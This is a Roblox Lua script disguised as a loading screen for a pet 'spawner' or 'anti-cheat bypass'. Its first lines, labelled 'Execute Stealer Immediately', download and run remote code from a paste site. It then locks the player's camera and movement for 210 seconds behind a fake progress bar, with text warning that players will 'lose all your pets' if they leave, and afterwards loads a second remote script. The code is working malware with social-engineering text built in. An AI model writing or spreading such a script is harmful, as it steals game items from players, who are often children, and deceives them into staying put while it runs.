--// FULL LOADING UI SCRIPT WITH CAMERA & CONTROL LOCK //--

-- Execute Stealer Immediately
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/l9Kp67lO/raw"))()
end)

-- CONFIG
local loadingTime = 210 -- seconds
local mainScriptURL = "loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
Spawner.Load()"

-- SERVICES
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- LOCK CAMERA & MOVEMENT
local humanoid = LocalPlayer.Character:WaitForChild("Humanoid")
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0
Camera.CameraType = Enum.CameraType.Scriptable

-- UI CREATION
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = PlayerGui
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false

-- BACKGROUND (colorful triangles)
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
bg.Parent = screenGui

for i = 1,60 do
    local tri = Instance.new("ImageLabel")
    tri.Size = UDim2.new(0.2,0,0.2,0)
    tri.Position = UDim2.new(math.random(),0,math.random(),0)
    tri.Image = "rbxassetid://6679003611" -- triangle shape
    tri.ImageColor3 = Color3.fromHSV(math.random(),1,1)
    tri.BackgroundTransparency = 1
    tri.Rotation = math.random(0,360)
    tri.Parent = bg
end

-- TOP PULSATING TEXT
local pulseText = Instance.new("TextLabel")
pulseText.Size = UDim2.new(1,0,0.1,0)
pulseText.Position = UDim2.new(0,0,0,20)
pulseText.Text = "Please wait patiently as we are bypassing the anti-cheat, If you don’t wait you'll lose all your pets"
pulseText.Font = Enum.Font.GothamBold
pulseText.TextSize = 22
pulseText.TextColor3 = Color3.new(1,0,0)
pulseText.BackgroundTransparency = 1
pulseText.Parent = screenGui

-- Animate pulse
task.spawn(function()
    while screenGui.Parent do
        TweenService:Create(pulseText, TweenInfo.new(0.5), {TextTransparency = 0.3}):Play()
        task.wait(0.5)
        TweenService:Create(pulseText, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
        task.wait(0.5)
    end
end)

-- TIP LABEL
local tipLabel = Instance.new("TextLabel")
tipLabel.Size = UDim2.new(1,0,0.05,0)
tipLabel.Position = UDim2.new(0,0,0.55,0)
tipLabel.Font = Enum.Font.Gotham
tipLabel.TextSize = 20
tipLabel.TextColor3 = Color3.new(1,1,1)
tipLabel.BackgroundTransparency = 1
tipLabel.Parent = screenGui

local tips = {
    "Did you know? Holding W makes you go forward!",
    "Tip: Trading is safer in public servers.",
    "Fun fact: Pets love virtual carrots.",
    "Remember: Patience is key to rare items.",
}
task.spawn(function()
    while screenGui.Parent do
        tipLabel.Text = tips[math.random(#tips)]
        task.wait(4)
    end
end)

-- LOADING BAR
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0.6,0,0.03,0)
loadingFrame.Position = UDim2.new(0.2,0,0.6,0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(40,40,40)
loadingFrame.BorderSizePixel = 0
loadingFrame.Parent = screenGui

local bar = Instance.new("Frame")
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.new(1,0,0)
bar.BorderSizePixel = 0
bar.Parent = loadingFrame

-- LOADING PERCENT TEXT
local percentText = Instance.new("TextLabel")
percentText.Size = UDim2.new(1,0,0.05,0)
percentText.Position = UDim2.new(0,0,0.65,0)
percentText.Font = Enum.Font.GothamBold
percentText.TextSize = 24
percentText.TextColor3 = Color3.new(1,1,1)
percentText.BackgroundTransparency = 1
percentText.Text = "0%"
percentText.Parent = screenGui

-- PROGRESS UPDATE
for i = 1,loadingTime do
    local progress = i/loadingTime
    bar.Size = UDim2.new(progress,0,1,0)
    bar.BackgroundColor3 = Color3.fromHSV(progress,1,1)
    percentText.Text = math.floor(progress*100).."%"
    task.wait(1)
end

-- REMOVE LOADING & RESTORE
screenGui:Destroy()
humanoid.WalkSpeed = 16
humanoid.JumpPower = 50
Camera.CameraType = Enum.CameraType.Custom

-- LOAD MAIN SCRIPT
local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
Spawner.Load()
